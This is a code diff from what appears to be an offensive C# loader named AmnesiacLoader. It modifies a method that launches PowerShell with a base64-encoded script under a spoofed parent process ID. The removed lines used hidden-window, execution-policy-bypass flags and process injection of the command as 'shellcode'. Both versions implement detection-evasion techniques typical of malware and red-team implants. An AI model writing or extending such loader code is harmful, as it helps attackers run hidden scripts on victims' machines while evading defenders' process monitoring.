@@ -19,16 +19,18 @@ namespace AmnesiacLoader
             return RunScriptInProcess(psScript);
         }
 
-        // Spawn processPath with PPID spoofed to spoofParentPid, inject a PowerShell
-        // encoded-command bootstrap as shellcode (UTF-8 command bytes).
+        // Spawn a new powershell.exe with PPID spoofed to spoofParentPid, running psScript
+        // via -EncodedCommand.  processPath is kept for API compatibility but ignored —
+        // powershell.exe is always used as the process host.
         public static bool SpawnUnmanagedPS(string processPath, string psScript, int spoofParentPid)
         {
-            // Encode psScript as EncodedCommand (UTF-16LE base64) for powershell.exe
             byte[] utf16  = Encoding.Unicode.GetBytes(psScript);
             string b64cmd = Convert.ToBase64String(utf16);
-            string fullCmd = "powershell.exe -ep bypass -nop -w hidden -EncodedCommand " + b64cmd;
-            byte[] shellcode = Encoding.UTF8.GetBytes(fullCmd);
-            return Injector.InjectNewProcess(processPath, shellcode, spoofParentPid);
+            string psExe  = System.IO.Path.Combine(
+                System.Environment.GetFolderPath(System.Environment.SpecialFolder.System),
+                @"WindowsPowerShell\v1.0\powershell.exe");
+            string cmdLine = psExe + " -EncodedCommand " + b64cmd;
+            return Injector.SpawnWithPPID(cmdLine, spoofParentPid);
         }
 
         static bool RunScriptInProcess(string psScript)
